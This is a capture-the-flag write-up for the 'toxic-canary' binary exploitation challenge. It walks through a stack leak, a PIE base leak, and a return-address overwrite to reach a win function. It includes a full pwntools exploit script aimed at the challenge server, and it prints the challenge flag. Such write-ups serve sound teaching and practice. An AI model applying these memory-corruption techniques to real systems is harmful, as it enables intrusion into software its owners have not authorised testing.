# Toxic Canary — PWN Challenge Writeup

**Challenge:** toxic-canary  
**Category:** PWN  
**Server:** `nc 14.225.212.104 9009`  
**Flag:** `VSL{7H3_M1N3r5_W0U1D_8r1N6_4_C463_W17H_4_C4N4rY_1N_17_70_D373C7_70X1C_645_134K5}`

---

## 1. Reconnaissance

### Binary Analysis

| Protection | Status |
|------------|--------|
| Architecture | amd64 |
| PIE | Enabled |
| RELRO | Full |
| Stack Canary | Enabled |
| NX | Enabled |

### Key Functions

- **`main`** — Main program logic with menu options
- **`win`** — Target function that opens and prints `flag.txt`
- **`patch_canary`** — Executed from `.init_array` at startup

### The "Toxic" Canary

The function `patch_canary()` runs at startup via `.init_array` and writes a `0x0a` (newline) byte into the TLS canary at `fs:0x28 + idx`. This creates a "toxic" canary that makes traditional canary leak methods difficult since `0x0a` terminates most string operations.

However, the intended solution bypasses the canary entirely.

---

## 2. Stack Layout Analysis

The `main` function uses the following stack layout:

```
+------------------+
| rbp - 0x128      | ← Saved return address (read's ret)
+------------------+
| rbp - 0x110      | ← Bob's name string location
+------------------+
| rbp - 0xf0       | ← name buffer (user input)
+------------------+
| rbp - 0xd0       | ← Bob's name pointer
+------------------+
| rbp - 0xc8       | ← Bob's quote pointer
+------------------+
| rbp - 0xb0       | ← Bob's quote string
+------------------+
```

The `print_info(person*)` function prints:
```c
printf("Name: %s\n", person->name);
printf("Best quote: %s\n", person->quote);
```

---

## 3. Vulnerabilities

### Bug A: Stack Info Leak (Missing NULL Termination)

At the start, `main` calls `read(0, name, 0x400)`. Since `read()` does not append a null terminator, when menu option **4** executes:

```c
printf("%s is your name ? ...", name);
scanf("%s", name);
```

If we send exactly `0x20` bytes (no null terminator), `printf("%s")` will continue printing past `name` into adjacent stack data — leaking Bob's name pointer at `name + 0x20`.

**Result:** We can calculate `rbp = bob_name_ptr + 0x110`

---

### Bug B: Pointer Overwrite (Unbounded scanf)

The same menu option **4** uses `scanf("%s", name)` with no length limit. This allows us to overflow `name` and overwrite:

- `[rbp - 0xd0]` → Bob's name pointer
- `[rbp - 0xc8]` → Bob's quote pointer

This turns option **1** ("Check Pob Ross") into an **arbitrary read primitive**.

---

### Bug C: Arbitrary Write (Option 3)

Menu option **3** → **1** ("Edit Pob Ross") executes:

```c
read(0, bob.name, 0x10);
```

If we overwrite Bob's name pointer first, this becomes an **arbitrary 16-byte write** to any address we control.

---

## 4. Exploitation Strategy (ret2win)

**Goal:** Redirect execution to `win()` function to print the flag.

### Step 1: Leak Stack Address

1. Send exactly `0x20` bytes as the name (no null terminator)
2. Trigger menu option **4** to leak Bob's name pointer
3. Calculate: `rbp = bob_name_ptr + 0x110`

### Step 2: Leak PIE Base Address

1. Use **Bug B** to set `bob.name = rbp - 0x128` (saved return address location)
2. Trigger option **1** to read the saved return address
3. Calculate: `pie_base = leaked_ret - 0x149f`
4. Calculate: `win = pie_base + win_offset`

### Step 3: Overwrite Return Address

1. Use **Bug B** again to set `bob.name = rbp - 0x128`
2. Trigger option **3** → **1** and send `p64(win)` as input
3. When `read()` returns, it jumps to `win()` instead
4. **Flag is printed!**

---

## 5. Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

HOST, PORT = "14.225.212.104", 9009
elf = ELF("./send2player/vuln", checksec=False)

context.arch = "amd64"
context.timeout = 2
marker = b" is your name"

def attempt():
    io = remote(HOST, PORT)

    # Step 1: Send 0x20 bytes to trigger stack leak
    io.recvuntil(b"Enter your name:")
    io.send(b"A" * 0x20)

    io.recvuntil(b"Please select option: ")
    io.sendline(b"4")

    # Parse leaked bob_name pointer
    data = io.recvuntil(marker)
    leak = data[len(b"A" * 0x20) : -len(marker)]
    if len(leak) != 6:
        io.close()
        return None

    bob_name = u64(leak.ljust(8, b"\x00"))
    rbp = bob_name + 0x110

    # Step 2: Overwrite bob.name to leak saved RIP
    io.sendline(b"B" * 0x20 + p64(rbp - 0x128) + p64(rbp - 0xb0))

    io.recvuntil(b"Please select option: ")
    io.sendline(b"1")
    io.recvuntil(b"Name: ")
    ret_bytes = io.recvuntil(b"\nBest quote: ", drop=True)
    ret = u64(ret_bytes.ljust(8, b"\x00"))

    # Calculate addresses
    pie_base = ret - 0x149f
    win = pie_base + elf.symbols["win"]

    # Step 3: Overwrite return address with win
    io.recvuntil(b"Please select option: ")
    io.sendline(b"4")
    io.recvuntil(b"again? ")
    io.sendline(b"C" * 0x20 + p64(rbp - 0x128))

    io.recvuntil(b"Please select option: ")
    io.sendline(b"3")
    io.recvuntil(b"for edit: ")
    io.sendline(b"1")
    io.recvuntil(b": ")
    io.send(p64(win))

    out = io.recvall(timeout=2)
    return out

# Retry until success (first read() may short-read)
for _ in range(200):
    out = attempt()
    if not out:
        continue
    if b"VSL{" in out:
        print(out.decode(errors="ignore"))
        break
```

---

## 6. Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                        TOXIC CANARY EXPLOIT                     │
└─────────────────────────────────────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 1: Stack Leak                                            │
│  ─────────────────────                                          │
│  Send 0x20 bytes → Trigger printf overflow → Leak bob_name_ptr  │
│  rbp = bob_name_ptr + 0x110                                     │
└─────────────────────────────────────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 2: PIE Leak                                              │
│  ─────────────────                                              │
│  Overwrite bob.name → Point to saved RIP → Leak via option 1    │
│  pie_base = ret - 0x149f                                        │
│  win = pie_base + win_offset                                    │
└─────────────────────────────────────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│  STAGE 3: Code Execution                                        │
│  ───────────────────────                                        │
│  Overwrite return address with win → read() returns to win()    │
│  win() prints flag.txt                                          │
└─────────────────────────────────────────────────────────────────┘
                               │
                               ▼
                        🚩 FLAG CAPTURED!
```

---

## 7. Key Takeaways

| Technique | Description |
|-----------|-------------|
| **Stack Leak** | Missing null terminator allows leaking adjacent stack data |
| **Arbitrary Read** | Overwriting struct pointers converts safe functions into leak primitives |
| **Arbitrary Write** | Same technique turns `read()` into a write-what-where primitive |
| **ret2win** | Classic technique — redirect execution to existing function |

---

## 8. Mitigation Bypass Summary

| Protection | Bypass Method |
|------------|---------------|
| **PIE** | Leaked return address from stack |
| **Stack Canary** | Bypassed entirely (overwrote return address, not canary) |
| **Full RELRO** | Not needed (used stack-based attack, not GOT overwrite) |
| **NX** | Used existing code (win function) instead of shellcode |

---

## References

- [Stack Buffer Overflow Attacks](https://ctf101.org/binary-exploitation/buffer-overflow/)
- [PIE and ASLR Bypass Techniques](https://ir0nstone.gitbook.io/notes/types/stack/aslr/pie-bypass)
- [ret2win CTF Technique](https://ropemporium.com/guide.html)
